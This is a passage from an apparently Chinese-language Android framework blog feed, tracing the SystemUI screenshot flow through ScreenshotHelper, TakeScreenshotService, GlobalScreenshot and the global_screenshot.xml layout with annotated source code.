class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">                    <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">                        <span class="keyword">case</span> SCREENSHOT_MSG_URI:</span><br><span class="line">                            <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                                completionConsumer.accept((Uri) msg.obj);</span><br><span class="line">                            &#125;</span><br><span class="line">                            handler.removeCallbacks(mScreenshotTimeout);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> SCREENSHOT_MSG_PROCESS_COMPLETE:</span><br><span class="line">                            <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                                resetConnection();</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            msg.replyTo = <span class="keyword">new</span> <span class="title class_">Messenger</span>(h);</span><br><span class="line">            <span class="keyword">if</span> (mScreenshotConnection == <span class="literal">null</span> || mScreenshotService == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 一个标准的Service连接</span></span><br><span class="line">                <span class="comment">// config_screenshotServiceComponent == com.android.systemui/com.android.systemui.screenshot.TakeScreenshotService</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">ComponentName</span> <span class="variable">serviceComponent</span> <span class="operator">=</span> ComponentName.unflattenFromString(</span><br><span class="line">                        mContext.getResources().getString(</span><br><span class="line">                                com.android.internal.R.string.config_screenshotServiceComponent));</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">serviceIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                serviceIntent.setComponent(serviceComponent);</span><br><span class="line">                <span class="type">ServiceConnection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="comment">// 当Service连接成功之后</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">                        <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (mScreenshotConnection != <span class="built_in">this</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            mScreenshotService = service;</span><br><span class="line">                            <span class="type">Messenger</span> <span class="variable">messenger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Messenger</span>(mScreenshotService);</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                messenger.send(msg);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                                Log.e(TAG, <span class="string">&quot;Couldn&#x27;t take screenshot: &quot;</span> + e);</span><br><span class="line">                                <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    completionConsumer.accept(<span class="literal">null</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="comment">// 当Service断开连接时</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;</span><br><span class="line">                        <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (mScreenshotConnection != <span class="literal">null</span>) &#123;</span><br><span class="line">                                resetConnection();</span><br><span class="line">                                <span class="comment">// only log an error if we&#x27;re still within the timeout period</span></span><br><span class="line">                                <span class="keyword">if</span> (handler.hasCallbacks(mScreenshotTimeout)) &#123;</span><br><span class="line">                                    handler.removeCallbacks(mScreenshotTimeout);</span><br><span class="line">                                    notifyScreenshotError();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">// bindService</span></span><br><span class="line">                <span class="keyword">if</span> (mContext.bindServiceAsUser(serviceIntent, conn,</span><br><span class="line">                        Context.BIND_AUTO_CREATE | Context.BIND_FOREGROUND_SERVICE,</span><br><span class="line">                        UserHandle.CURRENT)) &#123;</span><br><span class="line">                    mScreenshotConnection = conn;</span><br><span class="line">                    handler.postDelayed(mScreenshotTimeout, timeoutMs);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果已经连接则直接发送Message</span></span><br><span class="line">                <span class="type">Messenger</span> <span class="variable">messenger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Messenger</span>(mScreenshotService);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    messenger.send(msg);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                    Log.e(TAG, <span class="string">&quot;Couldn&#x27;t take screenshot: &quot;</span> + e);</span><br><span class="line">                    <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        completionConsumer.accept(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                handler.postDelayed(mScreenshotTimeout, timeoutMs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端通过向服务端发送 message 来将截屏任务交给 service，由 service 处理后面的操作。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenshot/TakeScreenshotService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">Handler</span> <span class="variable">mHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.myLooper()) &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取客户端传的 Messenger 对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Messenger</span> <span class="variable">callback</span> <span class="operator">=</span> msg.replyTo;</span><br><span class="line">        Consumer&lt;Uri&gt; uriConsumer = uri -&gt; &#123;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">reply</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, SCREENSHOT_MSG_URI, uri);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                / /Messenger 双向通信，在服务端用远程客户端的 Messenger 对象给客户端发送信息</span><br><span class="line">                callback.send(reply);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">onComplete</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">reply</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, SCREENSHOT_MSG_PROCESS_COMPLETE);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                callback.send(reply);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断用户的设备是否为解锁状态</span></span><br><span class="line">        <span class="comment">// 如果用户的存储被锁定，我们没有地方存储截图，所以跳过它，而不是显示一个误导性的动画和错误通知。</span></span><br><span class="line">        <span class="keyword">if</span> (!mUserManager.isUserUnlocked()) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">&quot;Skipping screenshot because storage is locked!&quot;</span>);</span><br><span class="line">            post(() -&gt; uriConsumer.accept(<span class="literal">null</span>));</span><br><span class="line">            post(onComplete);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ScreenshotHelper.<span class="type">ScreenshotRequest</span> <span class="variable">screenshotRequest</span> <span class="operator">=</span></span><br><span class="line">                (ScreenshotHelper.ScreenshotRequest) msg.obj;</span><br><span class="line">        mUiEventLogger.log(ScreenshotEvent.getScreenshotSource(screenshotRequest.getSource()));</span><br><span class="line">        <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">            <span class="keyword">case</span> WindowManager.TAKE_SCREENSHOT_FULLSCREEN:  <span class="comment">// 全屏截图</span></span><br><span class="line">                <span class="comment">// 我们在PhoneWindowManager传入的type为全屏截图,所以需要执行全屏截图流程</span></span><br><span class="line">                mScreenshot.takeScreenshot(uriConsumer, onComplete);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> WindowManager.TAKE_SCREENSHOT_SELECTED_REGION:  <span class="comment">// 区域截图</span></span><br><span class="line">                mScreenshot.takeScreenshot(uriConsumer, onComplete);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> WindowManager.TAKE_SCREENSHOT_PROVIDED_IMAGE:</span><br><span class="line">                <span class="type">Bitmap</span> <span class="variable">screenshot</span> <span class="operator">=</span> BitmapUtil.bundleToHardwareBitmap(</span><br><span class="line">                        screenshotRequest.getBitmapBundle());</span><br><span class="line">                <span class="type">Rect</span> <span class="variable">screenBounds</span> <span class="operator">=</span> screenshotRequest.getBoundsInScreen();</span><br><span class="line">                <span class="type">Insets</span> <span class="variable">insets</span> <span class="operator">=</span> screenshotRequest.getInsets();</span><br><span class="line">                <span class="type">int</span> <span class="variable">taskId</span> <span class="operator">=</span> screenshotRequest.getTaskId();</span><br><span class="line">                <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> screenshotRequest.getUserId();</span><br><span class="line">                <span class="type">ComponentName</span> <span class="variable">topComponent</span> <span class="operator">=</span> screenshotRequest.getTopComponent();</span><br><span class="line">                mScreenshot.handleImageAsScreenshot(screenshot, screenBounds, insets,</span><br><span class="line">                        taskId, userId, topComponent, uriConsumer, onComplete);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;Invalid screenshot option: &quot;</span> + msg.what);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>TakeScreenshotService调用GlobalScreenshot.java的takeScreenshot()；<br>GlobalScreenshot#takeScreenshot()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GlobalScreenshot.java</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *截取当前显示的屏幕截图并显示动画。.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(Consumer&lt;Uri&gt; finisher, Rect crop)</span> &#123;</span><br><span class="line">        <span class="comment">// copy the input Rect, since SurfaceControl.screenshot can mutate it</span></span><br><span class="line">        <span class="type">Rect</span> <span class="variable">screenRect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rect</span>(crop);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rot</span> <span class="operator">=</span> mDisplay.getRotation();</span><br><span class="line">        <span class="type">int</span> <span class="variable">width</span> <span class="operator">=</span> crop.width();</span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> crop.height();</span><br><span class="line">        takeScreenshot(SurfaceControl.screenshot(crop, width, height, rot), finisher, screenRect,</span><br><span class="line">                Insets.NONE, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(Bitmap screenshot, Consumer&lt;Uri&gt; finisher, Rect screenRect,</span></span><br><span class="line"><span class="params">            Insets screenInsets, <span class="type">boolean</span> showFlash)</span> &#123;</span><br><span class="line">        <span class="comment">// 此方法会清除上一次的截图信息--连续截图行为</span></span><br><span class="line">        dismissScreenshot(<span class="string">&quot;new screenshot requested&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        mScreenBitmap = screenshot;</span><br><span class="line">        <span class="keyword">if</span> (mScreenBitmap == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有Bitmap则报告错误信息</span></span><br><span class="line">            mNotificationsController.notifyScreenshotError(</span><br><span class="line">                    R.string.screenshot_failed_to_capture_text);</span><br><span class="line">            finisher.accept(<span class="literal">null</span>);</span><br><span class="line">            mOnCompleteRunnable.run();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!isUserSetupComplete()) &#123;</span><br><span class="line">            <span class="comment">// 用户设置尚未完成,不应该向用户展示 分享和编辑 , 只显示一个Toast并保存图片</span></span><br><span class="line">            saveScreenshotAndToast(finisher);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Optimizations</span></span><br><span class="line">        mScreenBitmap.setHasAlpha(<span class="literal">false</span>);</span><br><span class="line">        mScreenBitmap.prepareToDraw();</span><br><span class="line">        onConfigChanged(mContext.getResources().getConfiguration());</span><br><span class="line">        <span class="keyword">if</span> (mDismissAnimation != <span class="literal">null</span> &amp;&amp; mDismissAnimation.isRunning()) &#123;</span><br><span class="line">            mDismissAnimation.cancel();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取焦点</span></span><br><span class="line">        setWindowFocusable(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 开始截图后动画</span></span><br><span class="line">        startAnimation(finisher, screenRect, screenInsets, showFlash);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 截屏后开始动画</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startAnimation</span><span class="params">(<span class="keyword">final</span> Consumer&lt;Uri&gt; finisher, Rect screenRect, Insets screenInsets,</span></span><br><span class="line"><span class="params">            <span class="type">boolean</span> showFlash)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mScreenshotIng == <span class="literal">false</span>) &#123;<span class="comment">//unisoc: Modify for bug1360276</span></span><br><span class="line">            mScreenshotIng = <span class="literal">true</span>;</span><br><span class="line">     </span><br><span class="line">            <span class="comment">// 如果开启了省电模式，显示 toast，以便有一些视觉提示已截取屏幕截图</span></span><br><span class="line">            <span class="type">PowerManager</span> <span class="variable">powerManager</span> <span class="operator">=</span>(PowerManager) mContext . getSystemService (Context.POWER_SERVICE);</span><br><span class="line">            <span class="keyword">if</span> (powerManager.isPowerSaveMode()) &#123;</span><br><span class="line">                Toast.makeText(mContext, R.string.screenshot_saved_title, Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">            mScreenshotHandler.post(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (!mScreenshotLayout.isAttachedToWindow()) &#123;</span><br><span class="line">                    <span class="comment">// mScreenshotLayout是截屏的缩略图的父View</span></span><br><span class="line">                    <span class="comment">// mScreenshotLayout 在 GlobalScreenshot.java 的构造方法中初始化。对应布局文件：global_screenshot.xml</span></span><br><span class="line">                    mWindowManager.addView(mScreenshotLayout, mWindowLayoutParams);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 动画相关的View</span></span><br><span class="line">                mScreenshotAnimatedView.setImageDrawable(</span><br><span class="line">                        createScreenDrawable(mScreenBitmap, screenInsets));</span><br><span class="line">                setAnimatedViewSize(screenRect.width(), screenRect.height());</span><br><span class="line">                <span class="comment">// 显示动画何时开始</span></span><br><span class="line">                mScreenshotAnimatedView.setVisibility(View.GONE);</span><br><span class="line">                <span class="comment">//缩略图显示的View,将native层返回的Bitmap加载到此View上</span></span><br><span class="line">                mScreenshotPreview.setImageDrawable(createScreenDrawable(mScreenBitmap, screenInsets));</span><br><span class="line">                <span class="comment">// 使静态预览不可见（消失），以便我们可以在屏幕上查询其位置</span></span><br><span class="line">                mScreenshotPreview.setVisibility(View.INVISIBLE);</span><br><span class="line">                mScreenshotHandler.post(() -&gt; &#123;</span><br><span class="line">                mScreenshotLayout.getViewTreeObserver().addOnComputeInternalInsetsListener(<span class="built_in">this</span>);</span><br><span class="line">                <span class="comment">// 创建动画</span></span><br><span class="line">                mScreenshotAnimation =</span><br><span class="line">                        createScreenshotDropInAnimation(screenRect, showFlash);</span><br><span class="line">                <span class="comment">// 保存截图</span></span><br><span class="line">                saveScreenshotInWorkerThread(finisher, <span class="keyword">new</span> <span class="title class_">ActionsReadyListener</span> () &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">void</span> <span class="title function_">onActionsReady</span> <span class="params">(SavedImageData imageData)</span> &#123;</span><br><span class="line">                        showUiOnActionsReady(imageData);</span><br><span class="line">                        mScreenshotIng = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="comment">// 播放快门声音以通知我们已截屏</span></span><br><span class="line">                mCameraSound.play(MediaActionSound.SHUTTER_CLICK);</span><br><span class="line">                <span class="keyword">if</span> (mScreenshotPreview.isAttachedToWindow()) &#123;</span><br><span class="line">                    mScreenshotPreview.setLayerType(View.LAYER_TYPE_HARDWARE, <span class="literal">null</span>);</span><br><span class="line">                    mScreenshotPreview.buildLayer();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 开始执行动画</span></span><br><span class="line">                mScreenshotAnimation.start();</span><br><span class="line">            &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个新的工作线程并将屏幕截图保存到媒体存储</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">saveScreenshotInWorkerThread</span><span class="params">(</span></span><br><span class="line"><span class="params">            Consumer&lt;Uri&gt; finisher, <span class="meta">@Nullable</span> ActionsReadyListener actionsReadyListener)</span> &#123;</span><br><span class="line">        <span class="type">SaveImageInBackgroundData</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SaveImageInBackgroundData</span>();</span><br><span class="line">        data.image = mScreenBitmap;  <span class="comment">// native 层返回的 Bitmap</span></span><br><span class="line">        data.finisher = finisher;</span><br><span class="line">        data.mActionsReadyListener = actionsReadyListener;</span><br><span class="line">        <span class="keyword">if</span> (mSaveInBgTask != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// just log success/failure for the pre-existing screenshot</span></span><br><span class="line">            <span class="comment">// 只需记录预先存在的屏幕截图的成功失败</span></span><br><span class="line">            mSaveInBgTask.setActionsReadyListener(<span class="keyword">new</span> <span class="title class_">ActionsReadyListener</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">void</span> <span class="title function_">onActionsReady</span><span class="params">(SavedImageData imageData)</span> &#123;</span><br><span class="line">                    logSuccessOnActionsReady(imageData);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 截图的一些信息存储在 SaveImageInBackgroundTask 中构建</span></span><br><span class="line">        mSaveInBgTask = <span class="keyword">new</span> <span class="title class_">SaveImageInBackgroundTask</span>(mContext, data);</span><br><span class="line">        mSaveInBgTask.execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到此截屏流程完毕,可以查看下截图的View的xml文件：global_screenshot.xml<br><strong>frameworks/base/packages/SystemUI/res/layout/global_screenshot.xml</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;FrameLayout</span><br><span class="line">    xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    android:id=<span class="string">&quot;@+id/global_screenshot_frame&quot;</span></span><br><span class="line">    android:layout_width=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">    android:layout_height=<span class="string">&quot;match_parent&quot;</span>&gt;</span><br><span class="line">    &lt;ImageView</span><br><span class="line">        android:id=<span class="string">&quot;@+id/global_screenshot_actions_background&quot;</span></span><br><span class="line">        android:layout_height=<span class="string">&quot;@dimen/screenshot_bg_protection_height&quot;</span></span><br><span class="line">        android:layout_width=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:layout_gravity=<span class="string">&quot;bottom&quot;</span></span><br><span class="line">        android:alpha=<span class="string">&quot;0.0&quot;</span></span><br><span class="line">        android:src=<span class="string">&quot;@drawable/screenshot_actions_background_protection&quot;</span>/&gt;</span><br><span class="line">    &lt;!--截屏动画相关的View --&gt;</span><br><span class="line">    &lt;ImageView</span><br><span class="line">        android:id=<span class="string">&quot;@+id/global_screenshot_animated_view&quot;</span></span><br><span class="line">        android:layout_width=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:layout_height=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:layout_gravity=<span class="string">&quot;top|start&quot;</span></span><br><span class="line">        android:visibility=<span class="string">&quot;gone&quot;</span></span><br><span class="line">        android:elevation=<span class="string">&quot;@dimen/screenshot_preview_elevation&quot;</span></span><br><span class="line">        android:background=<span class="string">&quot;@drawable/screenshot_rounded_corners&quot;</span> /&gt;</span><br><span class="line">    &lt;ImageView</span><br><span class="line">        android:id=<span class="string">&quot;@+id/global_screenshot_flash&quot;</span></span><br><span class="line">        android:layout_width=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:layout_height=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:visibility=<span class="string">&quot;gone&quot;</span></span><br><span class="line">        android:elevation=<span class="string">&quot;@dimen/screenshot_preview_elevation&quot;</span></span><br><span class="line">        android:src=<span class="string">&quot;@android:color/white&quot;</span>/&gt;</span><br><span class="line">    &lt;com.android.systemui.screenshot.ScreenshotSelectorView</span><br><span class="line">        android:id=<span class="string">&quot;@+id/global_screenshot_selector&quot;</span></span><br><span class="line">        android:layout_width=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:layout_height=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:visibility=<span class="string">&quot;gone&quot;</span></span><br><span class="line">        android:pointerIcon=<span class="string">&quot;crosshair&quot;</span>/&gt;</span><br><span class="line">    &lt;!-- 此处包含了一个layout, 而缩略图的View就在此layout中，</span><br><span class="line">         截屏右上角的关闭缩略图按钮 也在此layout中 --&gt;</span><br><span class="line">    &lt;include layout=<span class="string">&quot;@layout/global_screenshot_static&quot;</span>/&gt;</span><br><span class="line">&lt;/FrameLayout&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android10.0 人脸解锁流程分析</title>
      <link href="/2023/12/10/2023-12-10/"/>
      <url>/2023/12/10/2023-12-10/</url>
      
